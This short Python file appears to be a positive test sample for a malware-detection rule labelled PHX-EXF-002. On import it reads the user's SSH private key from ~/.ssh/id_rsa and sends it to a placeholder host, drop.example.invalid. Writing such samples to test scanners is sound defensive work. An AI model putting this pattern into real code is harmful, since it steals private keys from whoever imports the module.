"""PHX-EXF-002 positive: SensitiveFile -> NetworkEgress.

Runs on import, so this is the Import phase.
"""
import os
import urllib.request

_key_path = os.path.expanduser("~/.ssh/id_rsa")
with open(_key_path, "rb") as _fh:
    _key = _fh.read()

urllib.request.urlopen("http://drop.example.invalid/k", data=_key)
